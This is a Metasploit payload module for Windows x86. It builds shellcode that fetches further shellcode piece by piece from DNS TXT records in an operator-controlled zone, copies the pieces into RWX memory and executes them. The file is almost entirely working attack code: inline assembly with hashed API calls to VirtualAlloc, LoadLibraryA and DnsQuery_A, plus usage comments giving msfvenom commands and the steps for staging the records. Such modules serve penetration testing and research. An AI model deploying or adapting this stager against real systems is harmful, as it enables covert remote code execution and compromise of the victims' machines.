##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 291

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Windows::BlockApi

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'DNS TXT Record Payload Download and Execution',
      'Description'   => %q{
        Performs a TXT query against a series of DNS record(s) and executes the returned x86 shellcode. The DNSZONE
        option is used as the base name to iterate over. The payload will first request the TXT contents of the a
        hostname, followed by b, then c, etc. until there are no more records. For each record that is returned, exactly
        255 bytes from it are copied into a buffer that is eventually executed. This buffer should be encoded using
        x86/alpha_mixed with the BufferRegister option set to EDI.
      },
      'Author'        =>
        [
          'corelanc0d3r <peter.ve[at]corelan.be>'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86
    ))

    # EXITFUNC is not supported
    deregister_options('EXITFUNC')

    # Register command execution options
    register_options(
      [
        OptString.new('DNSZONE', [ true, "The DNS zone to query" ]),
      ])
  end

  #
  # Usage :
  # 1. Generate the shellcode you want to deliver via DNS TXT queries
  #    Make sure the shellcode is alpha_mixed or alpha_upper and uses EDI as bufferregister
  #    Example :
  #   ./msfvenom -p windows/messagebox TITLE="Friendly message from corelanc0d3r" TEXT="DNS Payloads FTW" -e x86/alpha_mixed Bufferregister=EDI -f raw
  #    Output : 658 bytes
  # 2. Split the alpha shellcode into individual parts of exactly 255 bytes (+ remaining bytes)
  #    In case of 658 bytes of payload, there will be 2 parts of 255 bytes, and one part of 144 bytes
  # 3. Create TXT records in a zone you control and put in a piece of the shellcode in each TXT record
  #    The last TXT record might have less than 255 bytes, that's fine
  #    The first part must be stored in the TXT record for prefix a.<yourdomain.com>
  #    The second part must be stored in the TXT record for b.<yourdomain.com>
  #    etc
  #    First part must start with a.  and all parts must be placed in consecutive records
  # 4. use the dns_txt_query payload in the exploit, specify the name of the DNS zone that contains the DNS TXT records
  #    Example: ./msfvenom -p windows/dns_txt_query_exec DNSZONE=corelan.eu -f c
  #    (Example will show a messagebox)
  #
  # DNS TXT Records :
  # a.corelan.eu  : contains first 255 bytes of the alpha shellcode
  # b.corelan.eu  : contains the next 255 bytes of the alpha shellcode
  # c.corelan.eu  : contains the last 144 bytes of the alpha shellcode

  def generate(_opts = {})

    dnsname   = datastore['DNSZONE']
    wType   = 0x0010  #DNS_TYPE_TEXT (TEXT)
    wTypeOffset = 0x1c

    queryoptions  = 0x248
      # DNS_QUERY_RETURN_MESSAGE (0x200)
      # DNS_QUERY_BYPASS_CACHE (0x08)
      # DNS_QUERY_NO_HOSTS_FILE (0x40)
      # DNS_QUERY_ONLY_TCP (0x02) <- not used atm

    bufferreg   = "edi"

    #create actual payload
    payload_data = %Q^
      cld                     ; clear direction flag
      call start              ; start main routine
      #{asm_block_api}
      ; actual routine
    start:
      pop ebp                 ; get ptr to block_api routine

    ; first allocate some space in heap to hold payload
    alloc_space:
      xor eax,eax             ; clear EAX
      push 0x40               ; flProtect (RWX)
      mov ah,0x10             ; set EAX to 0x1000 (should be big enough to hold up to 26 * 255 bytes)
      push eax                ; flAllocationType MEM_COMMIT (0x1000)
      push eax                ; dwSize (0x1000)
      push 0x0                ; lpAddress
      push #{Rex::Text.block_api_hash("kernel32.dll", "VirtualAlloc")}
      call ebp
      push eax                ; save pointer on stack, will be used in memcpy
      mov #{bufferreg}, eax   ; save pointer, to jump to at the end


    ; load dnsapi.dll
    load_dnsapi:
      xor eax,eax             ; put part of string (hex) in eax
      mov al,0x70
      mov ah,0x69
      push eax                ; push 'dnsapi' to the stack
      push 0x61736e64         ; ...
      push esp                ; Push a pointer to the 'dnsapi' string on the stack.
      push #{Rex::Text.block_api_hash("kernel32.dll", "LoadLibraryA")}
      call ebp                ; LoadLibraryA( "dnsapi" )

    ;prepare for loop of queries
      mov bl,0x61             ; first query, start with 'a'

    dnsquery:
      jmp.i8 get_dnsname      ; get dnsname

    get_dnsname_return:
      pop eax                 ; get ptr to dnsname (lpstrName)
      mov [eax],bl            ; patch sequence number in place
      xchg esi,ebx            ; save sequence number
      push esp                ; prepare ppQueryResultsSet
      pop ebx                 ; (put ptr to ptr to stack on stack)
      sub ebx,4
      push ebx
      push 0x0                ; pReserved
      push ebx                ; ppQueryResultsSet
      push 0x0                ; pExtra
      push #{queryoptions}    ; Options
      push #{wType}           ; wType
      push eax                ; lpstrName
      push #{Rex::Text.block_api_hash("dnsapi.dll", "DnsQuery_A")}
      call ebp                ;
      test eax, eax           ; query ok?
      jnz jump_to_payload     ; no, jump to payload
      jmp.i8 get_query_result ; eax = 0 : a piece returned, fetch it

    get_dnsname:
      call get_dnsname_return
      db "a.#{dnsname}", 0x00

    get_query_result:
      xchg #{bufferreg},edx           ; save start of heap
      pop #{bufferreg}                ; heap structure containing DNS results (DNS_TXT_DATAA)
      mov eax,[#{bufferreg}+0x18]     ; check the number of strings in the response
      cmp eax,1                       ; skip if there's not exactly 1 string in the response
      jne prepare_payload             ; jmp to payload
      add #{bufferreg},#{wTypeOffset} ; get ptr to ptr to DNS reply
      mov #{bufferreg},[#{bufferreg}] ; get ptr to DNS reply

    copy_piece_to_heap:
      xchg ebx,esi                    ; save counter
      mov esi,edi                     ; set source
      mov edi,[esp+0x8]               ; retrieve heap destination for memcpy
      xor ecx,ecx                     ; clear ecx
      mov cl,0xff                     ; always copy 255 bytes, no matter what
      rep movsb                       ; copy from ESI to EDI
      push edi                        ; save target for next copy
      push edi                        ; 2 more times to make sure it's at esp+8
      push edi                        ;
      inc ebx                         ; increment sequence
      xchg #{bufferreg},edx           ; restore start of heap
      jmp.i8 dnsquery                 ; try to get the next piece, if any

    prepare_payload:
      mov #{bufferreg},edx

    jump_to_payload:
      jmp #{bufferreg}  ; jump to it
^
    self.assembly = payload_data
    super
  end
end
